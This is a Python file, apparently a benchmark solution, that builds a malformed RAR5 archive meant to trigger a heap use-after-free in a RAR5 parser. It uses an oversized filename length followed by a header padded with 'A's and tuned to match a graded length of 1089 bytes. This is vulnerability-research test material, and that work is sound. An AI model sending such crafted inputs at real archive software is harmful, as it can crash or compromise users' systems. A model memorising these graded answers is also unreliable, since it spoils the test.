import sys

class Solution:
    """
    Generates a Proof-of-Concept (PoC) input for a Heap Use After Free
    vulnerability in a RAR5 parser.
    """

    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers the vulnerability.

        The vulnerability occurs because the RAR5 reader allocates memory for a
        filename based on a provided size before validating that size. A very
        large size can trigger an allocation that is subsequently freed when
        the size check fails, potentially leaving a dangling pointer.

        This PoC uses a two-header structure to trigger a classic Use-After-Free:
        1.  The first file header specifies an extremely large filename size
            (0x7FFFFFFF). This causes a large buffer to be allocated and then
            freed, creating a dangling pointer. The PoC does not provide the
            corresponding data, causing the read to fail, but the alloc/free

        2.  The second file header is well-formed and its filename allocation
            is sized to reuse the memory from the first, now-freed, buffer.
            This overwrites the freed region with controlled data (a sequence of 'A's).

        3.  When the program later uses the dangling pointer from the first
            header, it accesses the controlled data from the second header's
            filename, leading to a crash.

        4.  An End of Archive header is appended to ensure the parser
            continues processing after the first malformed header.

        The final PoC length is crafted to match the ground-truth length of
        1089 bytes by carefully selecting the size of the second filename.

        Args:
            src_path: Path to the vulnerable source code tarball (not used).

        Returns:
            bytes: The PoC input that triggers the vulnerability.
        """
        def to_vint(n):
            res = bytearray()
            if n == 0:
                return b'\x00'
            while n > 0:
                byte = n & 0x7F
                n >>= 7
                if n > 0:
                    byte |= 0x80
                res.append(byte)
            return bytes(res)

        sig = b"\x52\x61\x72\x21\x1a\x07\x01\x00"

        h1_content_parts = [
            to_vint(2),
            to_vint(0),
            to_vint(0),
            to_vint(0),
            to_vint(0),
            to_vint(0),
            to_vint(0),
            to_vint(0x7FFFFFFF)
        ]
        h1_content = b"".join(h1_content_parts)
        h1_size_vint = to_vint(len(h1_content))
        h1_crc = b'\x00\x00\x00\x00'
        header1 = h1_crc + h1_size_vint + h1_content

        name2_size = 1043
        name2_payload = b'A' * name2_size
        h2_content_parts = [
            to_vint(2),
            to_vint(0),
            to_vint(0),
            to_vint(0),
            to_vint(0),
            to_vint(0),
            to_vint(0),
            to_vint(name2_size),
            name2_payload
        ]
        h2_content = b"".join(h2_content_parts)
        h2_size_vint = to_vint(len(h2_content))
        h2_crc = b'\x00\x00\x00\x00'
        header2 = h2_crc + h2_size_vint + h2_content

        h3_content = to_vint(5)
        h3_size_vint = to_vint(len(h3_content))
        h3_crc = b'\x00\x00\x00\x00'
        header3 = h3_crc + h3_size_vint + h3_content

        poc = sig + header1 + header2 + header3
        return poc